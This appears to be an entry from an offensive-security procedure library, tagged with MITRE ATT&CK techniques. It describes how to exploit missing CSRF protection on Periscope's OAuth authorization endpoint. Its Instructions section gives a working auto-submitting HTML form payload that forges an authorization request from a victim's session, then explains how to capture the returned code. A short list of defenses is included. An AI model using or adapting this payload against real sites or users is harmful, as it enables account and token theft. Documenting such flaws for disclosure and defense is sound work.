---
tags:
  - csrf
  - oauth
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[Steal Application Access Token]]'
updated_at: '2025-12-14T17:30:35.137Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 344bb7fb-bd5d-4ae4-b745-525752dce76b
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[Steal Application Access Token]]'
---
# Trigger CSRF via Malicious Site to Obtain Authorization Code

## Summary

This procedure exploits the lack of CSRF protections in Periscope's OAuth authorization endpoint by hosting a malicious page that auto-submits a forged authorization form, stealing the code from the victim's session.

## Description

The /oauthAuthorize POST endpoint at https://www.periscope.tv lacks CSRF tokens or Origin validation, allowing third-party sites to submit forms on behalf of authenticated users. A PoC site redirects to the OAuth URL with attacker-controlled client_id and redirect_uri, granting the code upon submission.

## Requirements

1. Authenticated victim session
2. Control over a web server for PoC page
3. Valid client_id and redirect_uri (e.g., from a registered app)

## Defense

Defensive measures and detection strategies:

- Add CSRF tokens to OAuth forms
- Validate Origin/Referer headers
- Use state parameters in OAuth flows
- Monitor for anomalous authorization grants

## Objectives

1. Forge authorization request via CSRF
2. Capture returned code
3. Enable token exchange

## Instructions

### Step 1: Host Malicious PoC Page

**Context**: Create a page that auto-submits the OAuth form to trigger CSRF.

Embed HTML form:

```html
<form action="https://www.periscope.tv/oauthAuthorize" method="POST" id="csrf-form">
  <input type="hidden" name="client_id" value="█████████">
  <input type="hidden" name="redirect_uri" value="https://getmevo.com/oauth/periscope">
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

> Expected: Immediate POST submission upon page load.

### Step 2: Capture Code from Redirect

**Context**: Intercept the redirect to extract the code.

Monitor https://getmevo.com/oauth/periscope?code=abcde&state= and copy 'code'.

> Expected: Valid code string in URL.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise
- [[Steal Application Access Token]] Steal Application Access Token

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[drive-by]]
